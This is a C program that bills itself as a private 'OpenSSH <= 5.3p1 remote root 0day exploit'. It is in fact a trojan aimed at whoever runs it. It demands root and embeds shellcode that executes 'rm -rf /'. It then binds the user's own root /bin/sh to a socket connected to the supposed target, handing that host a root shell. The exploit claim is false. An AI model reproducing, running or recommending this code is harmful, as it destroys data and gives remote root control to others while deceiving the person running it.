#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void usage(char *argv[]) {
    printf("\n\t[+] HATSUNEMIKU\n");
    printf("\t[+] OpenSSH <= 5.3p1 remote root 0day exploit\n");
    printf("\t[+] By: Team foxx\n");
    printf("\t[+] Greetz to hackforums.net\n");
    printf("\t[+] Keep this 0day priv8!\n");
    printf("\t[+] usage: %s <target> <port>\n\n", argv[0]);
    exit(1);
}

unsigned char decoder[] = "\x6a\x0b\x58\x99\x52"
                           "\x6a\x2f\x89\xe7\x52"
                           "\x66\x68\x2d\x66\x89"
                           "\xe6\x52\x66\x68\x2d"
                           "\x72\x89\xe1\x52\x68"
                           "\x2f\x2f\x72\x6d\x68"
                           "\x2f\x62\x69\x6e\x89"
                           "\xe3\x52\x57\x56\x51"
                           "\x53\x89\xe1\xcd\x80";

unsigned char rootshell[] = "\x31\xd2\xb2\x0a\xb9\x6f\x75\x21\x0a\x51\xb9\x63\x6b"
                           "\x20\x79\x51\x66\xb9\x66\x75\x66\x51\x31\xc9\x89\xe1"
                           "\x31\xdb\xb3\x01\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x31"
                           "\xdb\x40\xcd\x80";

int main(int argc, char **argv) {
    int euid = geteuid();
    int port = 22, sock;
    struct sockaddr_in addr;

    if (euid != 0) {
        fprintf(stderr, "You need to be root to use raw sockets.\n");
        exit(1);
    }

    if (argc != 3)
        usage(argv);

    char *h = argv[1];
    if (atoi(argv[2]) != 0)
        port = atoi(argv[2]);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    struct hostent *host = gethostbyname(h);
    if (host == NULL) {
        fprintf(stderr, "Unable to resolve hostname.\n");
        exit(1);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, host->h_addr, host->h_length);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Connection failed");
        exit(1);
    }

    char payload[sizeof(decoder) + sizeof(rootshell)];
    memcpy(payload, decoder, sizeof(decoder));
    memcpy(payload + sizeof(decoder) - 1, rootshell, sizeof(rootshell));

    if (send(sock, payload, sizeof(payload), 0) < 0) {
        perror("Payload sending failed");
        exit(1);
    }

    close(sock);

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Second socket creation failed");
        exit(1);
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Second connection failed");
        exit(1);
    } else {
        printf("[+] g0t sh3ll!\n");
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/sh", "/bin/sh", NULL);
    }

    close(sock);
    return 0;
}

